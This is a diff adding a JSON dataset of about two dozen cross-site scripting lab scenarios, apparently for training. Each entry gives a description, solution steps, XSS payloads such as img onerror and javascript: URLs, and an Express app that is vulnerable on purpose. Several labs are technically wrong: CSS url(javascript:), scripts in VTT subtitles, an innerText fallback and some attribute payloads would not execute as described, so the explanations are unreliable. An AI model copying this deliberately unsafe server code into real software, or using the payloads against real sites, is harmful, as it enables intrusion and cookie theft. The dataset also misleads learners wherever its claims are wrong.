@@ -1,0 +1,409 @@
+[
+  {
+    "Lab scenario": "XSS via JavaScript URL in clickable breadcrumb",
+    "Lab Description": "The breadcrumb component builds navigation paths using query parameters and sets them in anchor `href` attributes. Supplying a `javascript:` link causes execution on click.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Submit query like ?crumb=javascript:alert(1)",
+      "Breadcrumb renders with href=javascript:...",
+      "Clicking the breadcrumb triggers the payload"
+    ],
+    "payloads": [
+      "javascript:alert(1)",
+      "javascript:confirm(document.cookie)"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/breadcrumbs', (req, res) => {\n  const crumb = req.query.crumb || '/';\n  res.send(`\n    <html>\n      <body>\n        <a href=\"${crumb}\">Back</a>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via clipboard injection in paste event",
+    "Lab Description": "The web app handles `paste` events and directly injects clipboard content into the DOM using innerHTML. If an attacker copies malicious HTML, pasting triggers XSS.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Copy: <img src=x onerror=alert(1)>",
+      "Paste into the editor",
+      "Editor inserts the payload unsanitized",
+      "Script executes immediately"
+    ],
+    "payloads": [
+      "<img src=x onerror=alert('pasteXSS')>",
+      "<svg/onload=alert(1)>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/paste-editor', (req, res) => {\n  res.send(`\n    <html>\n      <body contenteditable='true' id='editor'></body>\n      <script>\n        document.getElementById('editor').addEventListener('paste', e => {\n          const pasted = e.clipboardData.getData('text/html') || e.clipboardData.getData('text/plain');\n          e.preventDefault();\n          document.execCommand('insertHTML', false, pasted);\n        });\n      </script>\n    </html>\n  `);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS in tag suggestions dropdown",
+    "Lab Description": "User-created tags are stored and rendered in a tag suggestions dropdown using innerHTML. A malicious tag name leads to XSS when suggestions are shown.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Create a tag named <script>alert(1)</script>",
+      "Visit tag search or edit page",
+      "Dropdown renders the malicious tag name",
+      "Script executes when suggestions appear"
+    ],
+    "payloads": [
+      "<script>alert('tagXSS')</script>",
+      "<img src=x onerror=alert(1)>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\nlet tags = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-tag', (req, res) => {\n  tags.push(req.body.tag);\n  res.redirect('/suggest');\n});\n\napp.get('/suggest', (req, res) => {\n  const html = tags.map(t => `<div class='tag'>${t}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via SVG title tooltip injection",
+    "Lab Description": "User-submitted content appears in the `<title>` element of inline SVG. Some browsers render this as tooltips, and malformed SVG titles can trigger XSS.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Create SVG with <title><script>alert(1)</script></title>",
+      "Submit to the app",
+      "Script executes when tooltip triggers or page loads"
+    ],
+    "payloads": [
+      "<svg><title><script>alert('svgTitle')</script></title></svg>",
+      "<svg><title><![CDATA[</title><script>alert(1)</script>]]></title></svg>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/svg-preview', (req, res) => {\n  res.send(`<html><body>${req.body}</body></html>`);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via username in audio transcript captions",
+    "Lab Description": "The app generates captions for audio recordings. Usernames are shown in speaker labels inside the transcript, inserted via innerHTML. Injected scripts run in the captions.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Register with username <img src=x onerror=alert(1)>",
+      "Join a voice session and generate transcript",
+      "View transcript in browser and observe payload execution"
+    ],
+    "payloads": [
+      "<img src=x onerror=alert('voiceXSS')>",
+      "<svg/onload=alert(1)>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\n\nlet transcript = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/speak', (req, res) => {\n  const { user, text } = req.body;\n  transcript += `<div><b>${user}:</b> ${text}</div>`;\n  res.redirect('/transcript');\n});\n\napp.get('/transcript', (req, res) => {\n  res.send(`<html><body>${transcript}</body></html>`);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via postMessage Reflection in Parent Window",
+    "Lab Description": "The application receives postMessage events from an iframe and injects the message into the DOM without validation. An attacker can craft a malicious iframe that sends a script payload via postMessage.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Host an iframe page that sends postMessage('<img src=x onerror=alert(1)>')",
+      "Embed the iframe in the parent app",
+      "Parent receives and injects message using innerHTML",
+      "Payload is executed in parent’s context"
+    ],
+    "payloads": [
+      "<script>alert('postMessageXSS')</script>",
+      "<img src=x onerror=alert(1)>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/parent', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <iframe src='/iframe'></iframe>\n        <div id='output'></div>\n        <script>\n          window.addEventListener('message', e => {\n            document.getElementById('output').innerHTML = e.data;\n          });\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.get('/iframe', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <script>\n          parent.postMessage('<img src=x onerror=alert(1)>', '*');\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via template tag cloning in shadow DOM",
+    "Lab Description": "The app uses a `<template>` tag within a shadow DOM to dynamically clone and inject HTML. Injected HTML inside the template escapes default sanitizers and executes upon cloning.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Inject <template><script>alert(1)</script></template>",
+      "App clones and attaches it inside shadow DOM",
+      "Script is executed when cloned"
+    ],
+    "payloads": [
+      "<template><script>alert('shadowXSS')</script></template>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/shadow-render', (req, res) => {\n  const content = req.body;\n  res.send(`\n    <html>\n      <body>\n        <div id='host'></div>\n        <template id='tpl'>${content}</template>\n        <script>\n          const root = document.getElementById('host').attachShadow({mode: 'open'});\n          const tpl = document.getElementById('tpl');\n          const clone = tpl.content.cloneNode(true);\n          root.appendChild(clone);\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via innerText fallback after failed rendering",
+    "Lab Description": "The app attempts to render user HTML input, and on failure falls back to innerText. However, if the original input remains in the DOM, some browsers may parse and execute delayed scripts.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Submit invalid HTML that breaks rendering",
+      "App falls back but does not sanitize",
+      "Browser re-parses content and executes scripts"
+    ],
+    "payloads": [
+      "<div><script>alert('fallbackXSS')</script></div>",
+      "<img src=1 onerror=alert(1)>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/render', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <div id='content'></div>\n        <script>\n          try {\n            document.getElementById('content').innerHTML = \`${req.body}\`;\n          } catch(e) {\n            document.getElementById('content').innerText = req.body;\n          }\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via localization translation key injection",
+    "Lab Description": "The app supports multilingual labels stored in a key-value object. If a user can manipulate keys, injecting HTML in a translation value leads to XSS when rendered via innerHTML.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Submit new translation key with HTML/JS payload",
+      "App renders it using innerHTML",
+      "Payload is executed in the DOM"
+    ],
+    "payloads": [
+      "<img src=x onerror=alert('l10nXSS')>",
+      "<script>alert('translate')</script>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\nlet translations = {};\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-translation', (req, res) => {\n  translations[req.body.key] = req.body.value;\n  res.redirect('/show');\n});\n\napp.get('/show', (req, res) => {\n  const label = translations['greeting'] || 'Hello';\n  res.send(`<html><body><div id='label'>${label}</div></body></html>`);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via `onanimationstart` in CSS keyframes",
+    "Lab Description": "Some browsers allow triggering JS via `onanimationstart` events in HTML tags. If an element uses an animation with JS in event handler, XSS is possible.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Inject tag with animation and `onanimationstart=alert(1)`",
+      "Use a defined CSS animation to trigger it",
+      "Payload runs when animation starts"
+    ],
+    "payloads": [
+      "<div style='animation: x 1s' onanimationstart=alert('cssXSS')></div>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/animated', (req, res) => {\n  res.send(`\n    <html>\n      <head>\n        <style>\n          @keyframes x { from { opacity: 0; } to { opacity: 1; } }\n        </style>\n      </head>\n      <body>${req.body}</body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via clipboard hijack on content-editable element",
+    "Lab Description": "The application includes a public message board with a content-editable area for writing. When malicious HTML is copied and pasted, it executes instantly because the app trusts clipboard HTML and injects it using `insertAdjacentHTML`.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Craft malicious HTML and copy to clipboard",
+      "Paste it into the editable div",
+      "Observe the payload executing on paste",
+      "Try invisible script payloads inside span or comment"
+    ],
+    "payloads": [
+      "<img src=x onerror=alert('clipboardXSS')>",
+      "<span><script>alert('paste')</script></span>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/board', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Message Board</h2>\n        <div contenteditable='true' id='editor'></div>\n        <script>\n          document.getElementById('editor').addEventListener('paste', e => {\n            const html = e.clipboardData.getData('text/html');\n            document.execCommand('insertHTML', false, html);\n            e.preventDefault();\n          });\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS in CSV export rendered as HTML preview",
+    "Lab Description": "The web application offers a CSV preview feature before download. Malicious cells with formula-like payloads are rendered using `innerHTML`, allowing execution.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Upload or inject a CSV with payload in a cell like =1+1<script>alert(1)</script>",
+      "Preview the CSV table in HTML",
+      "Observe the payload executing in the rendered table"
+    ],
+    "payloads": [
+      "=1+1<script>alert('csvXSS')</script>",
+      "<td><img src=x onerror=alert(1)></td>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/preview-csv', (req, res) => {\n  const rows = req.body.trim().split('\\n').map(row => '<tr>' + row.split(',').map(cell => `<td>${cell}</td>`).join('') + '</tr>').join('');\n  res.send(`<html><body><table>${rows}</table></body></html>`);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS through malformed image alt attribute in CMS",
+    "Lab Description": "The CMS allows editors to insert images with custom `alt` text. If the `alt` text contains malformed attributes or tags, it's rendered inside an image preview tooltip, which is injected with innerHTML.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Insert image with alt='<img src=x onerror=alert(1)>'",
+      "Hover over the image in preview mode",
+      "Observe payload execution",
+      "Try variations of malformed quotes or tags"
+    ],
+    "payloads": [
+      "\" onerror=alert('altXSS')",
+      "'><script>alert(1)</script>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-image', (req, res) => {\n  const alt = req.body.alt;\n  res.send(`<html><body><img src='img.png' alt='${alt}' title='${alt}'></body></html>`);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via `aria-label` reflection in accessibility component",
+    "Lab Description": "The site supports screen readers with `aria-label` attributes on buttons and links. User-controlled values are inserted without escaping, allowing JS injection inside the DOM structure.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Submit malicious input like <img src=x onerror=alert(1)> as label",
+      "The app reflects it in `aria-label` attributes or tooltips",
+      "Payload is parsed and executed in DOM"
+    ],
+    "payloads": [
+      "<img src=x onerror=alert('ariaXSS')>",
+      "<svg/onload=alert(1)>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/label-button', (req, res) => {\n  const label = req.body.label;\n  res.send(`<html><body><button aria-label='${label}'>Click</button></body></html>`);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via CSS variable injection inside style tag",
+    "Lab Description": "Users can define CSS variables (e.g., for themes), but values are interpolated directly into a `<style>` tag, allowing for JS injection in some browsers via `url(javascript:...)`.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Submit custom CSS variable like --bg:url(javascript:alert(1))",
+      "App injects it inside a `<style>` block",
+      "JS payload executes when used in a background property"
+    ],
+    "payloads": [
+      "--bg:url(javascript:alert('cssVar'))",
+      "--xss:url(data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/theme', (req, res) => {\n  const theme = req.body.vars;\n  res.send(`\n    <html>\n      <head>\n        <style>:root { ${theme} } body { background: var(--bg); }</style>\n      </head>\n      <body>Welcome</body>\n    </html>`);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via dynamic script injection in error stack trace viewer",
+    "Lab Description": "The application displays backend error stack traces for debugging. User input is sometimes logged and reflected in the error message, which is rendered with innerHTML for styling. An attacker can trigger an error with a crafted payload that executes in the trace viewer.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Send a request that causes a server error and includes a script in the input",
+      "Error message reflects the input in the trace log",
+      "Stack trace viewer uses innerHTML, executing the payload"
+    ],
+    "payloads": [
+      "<script>alert('traceXSS')</script>",
+      "<img src=x onerror=alert('stack')>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/debug', (req, res) => {\n  const q = req.query.q;\n  try {\n    if (q.includes('<')) throw new Error('Invalid input: ' + q);\n    res.send('OK');\n  } catch (err) {\n    res.send(`\n      <html>\n        <body>\n          <h2>Error Trace</h2>\n          <div style='color:red'>${err.message}</div>\n        </body>\n      </html>\n    `);\n  }\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via Markdown image alt injection in preview pane",
+    "Lab Description": "Markdown input is rendered to HTML using a parser that does not escape special characters in image `alt` attributes. A payload in the alt text leads to DOM injection.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Submit a markdown like ![\" onerror=alert(1)](x)",
+      "Preview renders markdown using innerHTML",
+      "Injected alt attribute triggers JavaScript"
+    ],
+    "payloads": [
+      "![' onerror=alert(1)](x)",
+      "![x\" onerror=alert('alt')](image.jpg)"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst marked = require('marked');\nconst app = express();\n\napp.use(express.text());\n\napp.post('/preview-md', (req, res) => {\n  const html = marked(req.body);\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via keyboard shortcut tooltip injection",
+    "Lab Description": "Keyboard shortcuts are rendered from user-defined actions. The key description is inserted into tooltip HTML using innerHTML, leading to XSS when hovering.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Define a shortcut with key text: <img src=x onerror=alert(1)>",
+      "Hover over the tooltip showing shortcut description",
+      "Observe the payload being executed"
+    ],
+    "payloads": [
+      "<img src=x onerror=alert('shortcut')>",
+      "<svg/onload=alert(1)>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\n\nlet shortcuts = [];\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-shortcut', (req, res) => {\n  shortcuts.push(req.body.key);\n  res.redirect('/shortcuts');\n});\n\napp.get('/shortcuts', (req, res) => {\n  const list = shortcuts.map(k => `<div class='tooltip' title='Shortcut: ${k}'>${k}</div>`).join('');\n  res.send(`<html><body>${list}</body></html>`);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via video player subtitle track injection",
+    "Lab Description": "The platform allows uploading subtitle (VTT) tracks that are rendered as HTML in a caption viewer. Malicious captions can contain script tags or on-event attributes.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Upload a VTT file containing malicious HTML inside cue",
+      "Render the video with captions enabled",
+      "Payload is injected into caption container"
+    ],
+    "payloads": [
+      "<script>alert('subXSS')</script>",
+      "<img src=x onerror=alert('track')>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\nlet track = '';\n\napp.use(express.text());\n\napp.post('/upload-track', (req, res) => {\n  track = req.body;\n  res.redirect('/player');\n});\n\napp.get('/player', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <video controls>\n          <track label=\"English\" kind=\"subtitles\" src=\"data:text/vtt,${encodeURIComponent(track)}\" default>\n        </video>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via dynamic `onload` injection in lazy-loaded components",
+    "Lab Description": "The application lazy-loads components by injecting script and HTML fragments based on user input. A payload in the load path is inserted into an `img` tag as `src`, allowing `onerror` to execute.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Craft a malicious fragment path with an onerror payload",
+      "Trigger the lazy-load mechanism",
+      "App injects HTML dynamically, executing the script"
+    ],
+    "payloads": [
+      "x\" onerror=\"alert('lazyXSS')",
+      "<svg/onload=alert(1)>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/lazy-load', (req, res) => {\n  const fragment = req.query.fragment;\n  res.send(`\n    <html>\n      <body>\n        <script>\n          const frag = '<img src=\"${fragment}\">';\n          document.body.insertAdjacentHTML('beforeend', frag);\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via QR Code data reflection in preview screen",
+    "Lab Description": "The application allows users to generate QR codes and preview the data embedded inside. The raw data is reflected in the preview window using innerHTML without escaping. If the data contains HTML, it will be executed in the browser.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Submit a QR code data payload with HTML or script tags",
+      "View the QR code preview page",
+      "Observe the reflected data executing in the preview"
+    ],
+    "payloads": [
+      "<script>alert('qrXSS')</script>",
+      "<img src=x onerror=alert('qr')>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/generate-qr', (req, res) => {\n  const data = req.body.qrdata;\n  res.send(`\n    <html>\n      <body>\n        <h3>QR Preview</h3>\n        <div id='preview'>${data}</div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via voice assistant command transcript display",
+    "Lab Description": "The application includes a voice command recognition system that transcribes spoken input and displays it on the interface. If an attacker controls the input (e.g., via audio injection), the transcript can include executable HTML.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Submit or simulate a voice command that contains a script tag",
+      "Transcript viewer renders it directly via innerHTML",
+      "Script executes immediately"
+    ],
+    "payloads": [
+      "<script>alert('voiceXSS')</script>",
+      "<img src=x onerror=alert(1)>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\nlet lastTranscript = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit-voice', (req, res) => {\n  lastTranscript = req.body.text;\n  res.redirect('/transcript');\n});\n\napp.get('/transcript', (req, res) => {\n  res.send(`<html><body><div id='speech'>${lastTranscript}</div></body></html>`);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via image gallery caption rendering",
+    "Lab Description": "Users can upload images and add captions. The captions are rendered using innerHTML below the images. If a caption contains a script or event handler, it will be executed.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "Upload image with caption <img src=x onerror=alert(1)>",
+      "Visit the gallery page",
+      "Payload in caption executes under image"
+    ],
+    "payloads": [
+      "<script>alert('captionXSS')</script>",
+      "<img src=x onerror=alert('imgCaption')>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\nlet captions = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload-caption', (req, res) => {\n  captions.push(req.body.caption);\n  res.redirect('/gallery');\n});\n\napp.get('/gallery', (req, res) => {\n  const html = captions.map(c => `<figure><img src='cat.jpg'><figcaption>${c}</figcaption></figure>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via terminal output rendering in web-based CLI",
+    "Lab Description": "The web-based CLI interface reflects command results using innerHTML. If a command returns crafted HTML, it gets executed in the terminal output.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Run a command like echo <script>alert(1)</script>",
+      "Terminal reflects the output unsanitized",
+      "Script executes in output container"
+    ],
+    "payloads": [
+      "<script>alert('cliXSS')</script>",
+      "<img src=x onerror=alert(1)>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/cli', (req, res) => {\n  const out = req.body.cmd;\n  res.send(`<html><body><pre>${out}</pre></body></html>`);\n});\n\napp.listen(3000);"
+  },
+  {
+    "Lab scenario": "XSS via chat bot training phrase injection",
+    "Lab Description": "The app allows users to submit new training phrases for a chat bot. These phrases are listed in the UI for review, and are rendered via innerHTML. A malicious phrase can execute script code.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Submit a training phrase like <script>alert('chat')</script>",
+      "Navigate to training UI",
+      "Script runs in reviewer’s browser"
+    ],
+    "payloads": [
+      "<script>alert('botXSS')</script>",
+      "<img src=x onerror=alert(1)>"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const express = require('express');\nconst app = express();\nlet phrases = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/train', (req, res) => {\n  phrases.push(req.body.phrase);\n  res.redirect('/review');\n});\n\napp.get('/review', (req, res) => {\n  const html = phrases.map(p => `<div>${p}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
+  }
+]
+
+
+
+
